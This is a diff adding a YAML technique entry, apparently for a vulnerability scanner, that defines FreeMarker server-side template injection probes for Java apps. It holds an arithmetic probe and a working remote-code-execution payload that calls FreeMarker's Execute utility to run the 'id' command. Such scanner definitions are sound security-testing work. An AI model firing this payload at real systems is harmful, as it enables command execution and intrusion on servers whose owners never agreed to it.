@@ -1,0 +1,18 @@
+techniques:
+  - id: ssti_freemarker
+    name: "SSTI - FreeMarker"
+    vuln_type: ssti
+    description: "Server-side template injection for Java FreeMarker"
+    severity: critical
+    technology: ["java", "freemarker"]
+    depth: standard
+    tags: ["ssti", "freemarker", "java"]
+    payloads:
+      - value: "${7*7}"
+        description: "Basic arithmetic"
+      - value: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+        description: "RCE via Execute utility"
+    detection:
+      - type: string
+        value: "49"
+        description: "Arithmetic evaluation"
